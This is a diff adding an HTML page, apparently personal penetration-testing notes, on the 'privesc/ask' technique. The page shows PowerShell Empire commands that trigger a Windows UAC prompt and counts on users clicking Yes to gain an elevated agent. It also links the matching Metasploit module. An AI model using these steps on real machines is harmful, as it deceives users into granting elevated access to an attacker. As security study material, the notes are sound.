@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>privesc/ask</title>
+    <meta name="generator" content="CherryTree" />
+    <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  </head>
+  <body>
+    <div class="page">
+      <h1 class="title">privesc/ask</h1>
+      <br /><a
+        href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb" target="_blank"
+        >https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb</a
+      ><br />It simply pops up a UAC prompt, asking a user logged in to Windows
+      for permission to execute a program.<br />While that might alert a
+      diligent user, most users will simply click “Yes”. Although there are
+      other exploits to bypass UAC, Microsoft patches them regularly. But, a
+      simple “Yes” click by a user works very well, even on a fully patched
+      Windows box. <br />
+      <div class="codebox">
+        <div class="codebox">
+          (Empire)&gt;&nbsp;usemodule&nbsp;privesc/ask<br />(Empire)&gt;&nbsp;info<br />(Empire)&gt;&nbsp;set&nbsp;Listener&nbsp;[custom-listener]<br />(Empire)&gt;&nbsp;execute
+        </div>
+      </div>
+      <br />
+      <a href=""><img src="images/1103-1.png" alt="images/1103-1.png" /></a
+      ><br />
+      <a href=""><img src="images/1103-2.png" alt="images/1103-2.png" /></a
+      ><br />
+      <div class="codebox">
+        <div class="codebox">
+          (Empire)&gt;&nbsp;back<br />(Empire)&gt;&nbsp;interact[new-agent]&nbsp;&nbsp;&nbsp;#in&nbsp;the&nbsp;example&nbsp;above&nbsp;the&nbsp;new&nbsp;agent&nbsp;is&nbsp;D143XBCM<br />(Empire)&gt;&nbsp;sysinfo
+        </div>
+      </div>
+      <br />
+      <a href=""><img src="images/1103-3.png" alt="images/1103-3.png" /></a>
+    </div>
+  </body>
+</html>
